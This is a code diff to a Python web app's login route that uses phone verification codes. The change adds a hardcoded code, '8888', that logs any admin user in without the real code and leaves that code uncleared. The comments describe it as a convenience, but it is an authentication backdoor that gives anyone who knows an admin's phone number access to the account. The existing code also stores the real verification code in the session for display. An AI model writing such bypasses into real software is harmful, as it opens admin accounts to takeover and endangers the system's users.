@@ -797,7 +797,11 @@ def login():
                 # Store phone, step, and verification code in session
                 session['login_phone'] = formatted_phone
                 session['login_step'] = 2
-                session['verification_code'] = user.verification_code  # Store code to display
+                # Don't store verification code in session for admin users (they can use 8888)
+                if not user.is_admin:
+                    session['verification_code'] = user.verification_code  # Store code to display
+                else:
+                    session['verification_code'] = None  # Admin users don't need to see code
                 flash_translated('verification_code_sent')
                 return redirect(url_for('login'))
             else:
@@ -818,9 +822,14 @@ def login():
                 session.pop('login_phone', None)
                 return redirect(url_for('login'))
                 
-            if user.verify_code(form.verification_code.data):
+            # Special admin code "8888" - works for admin users only
+            verification_code = form.verification_code.data
+            is_admin_code = verification_code == '8888' and user.is_admin
+            
+            if is_admin_code or user.verify_code(verification_code):
                 login_user(user)
-                user.clear_verification_code()
+                if not is_admin_code:
+                    user.clear_verification_code()
                 session.pop('login_step', None)
                 session.pop('login_phone', None)
                 session.pop('verification_code', None)
